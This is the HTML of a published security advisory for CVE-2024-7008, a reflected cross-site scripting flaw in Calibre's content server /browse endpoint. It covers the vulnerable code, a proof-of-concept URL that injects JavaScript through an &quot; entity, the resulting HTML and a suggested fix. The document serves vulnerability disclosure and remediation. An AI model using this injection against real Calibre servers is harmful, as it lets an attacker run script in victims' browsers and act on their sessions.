<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2024-7008) Calibre Reflected Cross-Site Scripting (XSS) | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary    Product Calibre     Vendor Calibre   Severity Medium   Affected Versions &lt;= 7.15.0 (latest version as of writing)   Tested Versions 7.15.0   CVE Identifier CVE-2024-7008   CWE Classification(s) CWE-79 Improper Neutralization of Input During Web Page Generation (XSS or &lsquo;Cross-site Scripting&rsquo;)   CAPEC Classification(s) CAPEC-591 Reflected XSS    CVSS3.1 Scoring System Base Score: 5.4 (Medium) Vector String: CVSS:3.">
<meta name="author" content="Devesh Logendran">
<link rel="canonical" href="https://starlabs.sg/advisories/24/24-7008/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2024-7008) Calibre Reflected Cross-Site Scripting (XSS)" />
<meta property="og:description" content="Summary    Product Calibre     Vendor Calibre   Severity Medium   Affected Versions &lt;= 7.15.0 (latest version as of writing)   Tested Versions 7.15.0   CVE Identifier CVE-2024-7008   CWE Classification(s) CWE-79 Improper Neutralization of Input During Web Page Generation (XSS or &lsquo;Cross-site Scripting&rsquo;)   CAPEC Classification(s) CAPEC-591 Reflected XSS    CVSS3.1 Scoring System Base Score: 5.4 (Medium) Vector String: CVSS:3." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/24/24-7008/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2024-07-31T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2024-07-31T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2024-7008) Calibre Reflected Cross-Site Scripting (XSS)"/>
<meta name="twitter:description" content="Summary    Product Calibre     Vendor Calibre   Severity Medium   Affected Versions &lt;= 7.15.0 (latest version as of writing)   Tested Versions 7.15.0   CVE Identifier CVE-2024-7008   CWE Classification(s) CWE-79 Improper Neutralization of Input During Web Page Generation (XSS or &lsquo;Cross-site Scripting&rsquo;)   CAPEC Classification(s) CAPEC-591 Reflected XSS    CVSS3.1 Scoring System Base Score: 5.4 (Medium) Vector String: CVSS:3."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2024-7008) Calibre Reflected Cross-Site Scripting (XSS)",
      "item": "https://starlabs.sg/advisories/24/24-7008/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2024-7008) Calibre Reflected Cross-Site Scripting (XSS)",
  "name": "(CVE-2024-7008) Calibre Reflected Cross-Site Scripting (XSS)",
  "description": "Summary    Product Calibre     Vendor Calibre   Severity Medium   Affected Versions \u0026lt;= 7.15.0 (latest version as of writing)   Tested Versions 7.15.0   CVE Identifier CVE-2024-7008   CWE Classification(s) CWE-79 Improper Neutralization of Input During Web Page Generation (XSS or \u0026lsquo;Cross-site Scripting\u0026rsquo;)   CAPEC Classification(s) CAPEC-591 Reflected XSS    CVSS3.1 Scoring System Base Score: 5.4 (Medium) Vector String: CVSS:3.",
  "keywords": [
    
  ],
  "articleBody": "Summary    Product Calibre     Vendor Calibre   Severity Medium   Affected Versions   Tested Versions 7.15.0   CVE Identifier CVE-2024-7008   CWE Classification(s) CWE-79 Improper Neutralization of Input During Web Page Generation (XSS or ‘Cross-site Scripting’)   CAPEC Classification(s) CAPEC-591 Reflected XSS    CVSS3.1 Scoring System Base Score: 5.4 (Medium) Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) None   User Interaction (UI) Required   Scope (S) Unchanged   Confidentiality (C) Low   Integrity (I) Low   Availability (A) None    Product Overview Calibre is a cross-platform free and open-source suite of e-book software. Calibre supports organizing existing e-books into virtual libraries, displaying, editing, creating and converting e-books, as well as syncing e-books with a variety of e-readers. Editing books is supported for EPUB and AZW3 formats. Books in other formats like MOBI must first be converted to those formats, if they are to be edited. Calibre also has a large collection of community contributed plugins.\nCalibre also offers a powerful content server feature. This allows users to share their Calibre libraries over the internet, making it easy to access your e-book collection from anywhere, at any time.\nVulnerability Summary It is possible to inject arbitrary JavaScript code into the /browse endpoint of the Calibre content server, allowing an attacker to craft a URL that when clicked by a victim, will execute the attacker’s JavaScript code in the context of the victim’s browser. If the Calibre server is running with authentication enabled and the victim is logged in at the time, this can be used to cause the victim to perform actions on the Calibre server on behalf of the attacker.\nVulnerability Details In src/calibre/srv/legacy.py, the browse endpoint is defined as follows:\n@endpoint('/browse/{+rest=\"\"}') def browse(ctx, rd, rest): if rest.startswith('book/'): # implementation of https://bugs.launchpad.net/calibre/+bug/1698411 # redirect old server book URLs to new URLs redirect = ctx.url_for(None) + '#book_id=' + rest[5:] + \"\u0026amp;panel=book_details\" from lxml import etree as ET return html(ctx, rd, endpoint, E.html(E.head( ET.XML('+ redirect + '\"/'), # [1] ET.XML('' + 'window.location.href = \"' + redirect + '\"' + # [2] '' )))) else: raise HTTPRedirect(ctx.url_for(None)) As can be seen from the code, if a user navigates to a URL of the form /browse/book/123, the server will insert the content after book/ straight into a variable redirect, followed by directly concatenating this variable into a meta refresh tag at [1] and a JavaScript redirect at [2] through the use of lxml’s etree.XML() function, without performing any sanitisation. The injection at [1] was not found to be exploitable as most attempts would result in malformed XML that would cause etree to raise an exception. However, the injection at [2] was found to be exploitable, due to lxml’s behaviour of expanding the \u0026quot; entity into \" before serialising the XML tree into a string.\n from lxml import etree\r etree.tostring(etree.XML(\"\u0026quot;\"))\rb'\"' Thus, we can use \u0026quot; to escape the string assignment and inject arbitrary JavaScript code into the page. This can be used to perform a reflected cross-site scripting attack.\nProof-of-Concept Browse to the following URL, where CALIBRE_SERVER is the address of the Calibre server:\nhttp://CALIBRE_SERVER/browse/book/TEST\u0026quot;;window.stop();alert(document.location);%2f%2f\nNote that the alert is executed in the context of the Calibre server’s origin:\nThe resulting HTML shows that the \u0026quot; entity was expanded into \", thus enabling the injection:\n htmlhead meta http-equiv=\"refresh\" content='0;url=/#book_id=TEST\";window.stop();alert(document.location);//\u0026amp;panel=book_details' script language=\"javascript\"window.location.href = \"/#book_id=TEST\";window.stop();alert(document.location);//\u0026panel=book_details\"script headhtml Suggested Mitigations Ensure that user input is safe before being used in the generation of HTML content. In this case, it appears that book IDs can only be digits, so it should suffice to ensure that the input is a digit before using it to generate the HTML.\nCredits Devesh Logendran of STAR Labs SG Pte. Ltd. (@starlabs_sg)\n",
  "wordCount" : "618",
  "inLanguage": "en",
  "datePublished": "2024-07-31T00:00:00Z",
  "dateModified": "2024-07-31T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Devesh Logendran"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/24/24-7008/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2024-7008) Calibre Reflected Cross-Site Scripting (XSS)
    </h1>
    <div class="post-meta"><span title='2024-07-31 00:00:00 +0000 UTC'>July 31, 2024</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;Devesh Logendran

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System">CVSS3.1 Scoring System</a></li>
                <li>
                    <a href="#product-overview" aria-label="Product Overview">Product Overview</a></li>
                <li>
                    <a href="#vulnerability-summary" aria-label="Vulnerability Summary">Vulnerability Summary</a></li>
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details">Vulnerability Details</a></li>
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-Concept">Proof-of-Concept</a></li>
                <li>
                    <a href="#suggested-mitigations" aria-label="Suggested Mitigations">Suggested Mitigations</a></li>
                <li>
                    <a href="#credits" aria-label="Credits">Credits</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Calibre</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>Calibre</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>Medium</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>&lt;= 7.15.0 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>7.15.0</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2024-7008</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-79 Improper Neutralization of Input During Web Page Generation (XSS or &lsquo;Cross-site Scripting&rsquo;)</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-591 Reflected XSS</td>
</tr>
</tbody>
</table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
<p><strong>Base Score:</strong> 5.4 (Medium)
<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>Required</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>None</td>
</tr>
</tbody>
</table>
<h2 id="product-overview">Product Overview<a hidden class="anchor" aria-hidden="true" href="#product-overview">#</a></h2>
<p>Calibre is a cross-platform free and open-source suite of e-book software. Calibre supports organizing existing e-books into virtual libraries, displaying, editing, creating and converting e-books, as well as syncing e-books with a variety of e-readers. Editing books is supported for EPUB and AZW3 formats. Books in other formats like MOBI must first be converted to those formats, if they are to be edited. Calibre also has a large collection of community contributed plugins.</p>
<p>Calibre also offers a powerful content server feature. This allows users to share their Calibre libraries over the internet, making it easy to access your e-book collection from anywhere, at any time.</p>
<h2 id="vulnerability-summary">Vulnerability Summary<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h2>
<p>It is possible to inject arbitrary JavaScript code into the <code>/browse</code> endpoint of the Calibre content server, allowing an attacker to craft a URL that when clicked by a victim, will execute the attacker&rsquo;s JavaScript code in the context of the victim&rsquo;s browser. If the Calibre server is running with authentication enabled and the victim is logged in at the time, this can be used to cause the victim to perform actions on the Calibre server on behalf of the attacker.</p>
<h2 id="vulnerability-details">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
<p>In <code>src/calibre/srv/legacy.py</code>, the <code>browse</code> endpoint is defined as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@endpoint</span><span class="p">(</span><span class="s1">&#39;/browse/{+rest=&#34;&#34;}&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">browse</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">rd</span><span class="p">,</span> <span class="n">rest</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">rest</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;book/&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># implementation of https://bugs.launchpad.net/calibre/+bug/1698411</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># redirect old server book URLs to new URLs</span>
</span></span><span class="line"><span class="cl">        <span class="n">redirect</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">.</span><span class="n">url_for</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;#book_id=&#39;</span> <span class="o">+</span> <span class="n">rest</span><span class="p">[</span><span class="mi">5</span><span class="p">:]</span> <span class="o">+</span> <span class="s2">&#34;&amp;amp;panel=book_details&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="kn">from</span> <span class="nn">lxml</span> <span class="kn">import</span> <span class="n">etree</span> <span class="k">as</span> <span class="n">ET</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">html</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">rd</span><span class="p">,</span> <span class="n">endpoint</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">E</span><span class="o">.</span><span class="n">html</span><span class="p">(</span><span class="n">E</span><span class="o">.</span><span class="n">head</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                     <span class="n">ET</span><span class="o">.</span><span class="n">XML</span><span class="p">(</span><span class="s1">&#39;&lt;meta http-equiv=&#34;refresh&#34; content=&#34;0;url=&#39;</span> <span class="o">+</span> <span class="n">redirect</span> <span class="o">+</span> <span class="s1">&#39;&#34;/&gt;&#39;</span><span class="p">),</span> <span class="c1"># [1]</span>
</span></span><span class="line"><span class="cl">                     <span class="n">ET</span><span class="o">.</span><span class="n">XML</span><span class="p">(</span><span class="s1">&#39;&lt;script language=&#34;javascript&#34;&gt;&#39;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                         <span class="s1">&#39;window.location.href = &#34;&#39;</span> <span class="o">+</span> <span class="n">redirect</span> <span class="o">+</span> <span class="s1">&#39;&#34;&#39;</span> <span class="o">+</span> <span class="c1"># [2]</span>
</span></span><span class="line"><span class="cl">                         <span class="s1">&#39;&lt;/script&gt;&#39;</span>
</span></span><span class="line"><span class="cl">                         <span class="p">))))</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="n">HTTPRedirect</span><span class="p">(</span><span class="n">ctx</span><span class="o">.</span><span class="n">url_for</span><span class="p">(</span><span class="kc">None</span><span class="p">))</span>
</span></span></code></pre></div><p>As can be seen from the code, if a user navigates to a URL of the form <code>/browse/book/123</code>, the server will insert the content after <code>book/</code> straight into a variable <code>redirect</code>, followed by directly concatenating this variable into a meta refresh tag at [1] and a JavaScript redirect at [2] through the use of lxml&rsquo;s <code>etree.XML()</code> function, without performing any sanitisation. The injection at [1] was not found to be exploitable as most attempts would result in malformed XML that would cause etree to raise an exception. However, the injection at [2] was found to be exploitable, due to lxml&rsquo;s behaviour of expanding the <code>&amp;quot;</code> entity into <code>&quot;</code> before serialising the XML tree into a string.</p>
<pre tabindex="0"><code>&gt;&gt;&gt; from lxml import etree
&gt;&gt;&gt; etree.tostring(etree.XML(&#34;&lt;script&gt;&amp;quot;&lt;/script&gt;&#34;))
b&#39;&lt;script&gt;&#34;&lt;/script&gt;&#39;
</code></pre><p>Thus, we can use <code>&amp;quot;</code> to escape the string assignment and inject arbitrary JavaScript code into the page. This can be used to perform a reflected cross-site scripting attack.</p>
<h2 id="proof-of-concept">Proof-of-Concept<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
<p>Browse to the following URL, where CALIBRE_SERVER is the address of the Calibre server:</p>
<p><code>http://CALIBRE_SERVER/browse/book/TEST&amp;quot;;window.stop();alert(document.location);%2f%2f</code></p>
<p>Note that the alert is executed in the context of the Calibre server&rsquo;s origin:</p>
<p><img loading="lazy" src="/advisories/24/images/CVE-2024-6782_01.calibre-xss.png" alt=""  />
</p>
<p>The resulting HTML shows that the <code>&amp;quot;</code> entity was expanded into <code>&quot;</code>, thus enabling the injection:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;refresh&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#39;0;url=/#book_id=TEST&#34;;window.stop();alert(document.location);//&amp;amp;panel=book_details&#39;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;javascript&#34;</span><span class="p">&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">&#34;/#book_id=TEST&#34;</span><span class="p">;</span><span class="nb">window</span><span class="p">.</span><span class="nx">stop</span><span class="p">();</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">);</span><span class="err">//&amp;panel=book_details&#34;</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="suggested-mitigations">Suggested Mitigations<a hidden class="anchor" aria-hidden="true" href="#suggested-mitigations">#</a></h2>
<p>Ensure that user input is safe before being used in the generation of HTML content. In this case, it appears that book IDs can only be digits, so it should suffice to ensure that the input is a digit before using it to generate the HTML.</p>
<h2 id="credits">Credits<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
<p>Devesh Logendran of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/24/24-6782/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2024-6782) Calibre Remote Code Execution</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/24/24-7009/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2024-7009) Calibre SQLite Injection</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
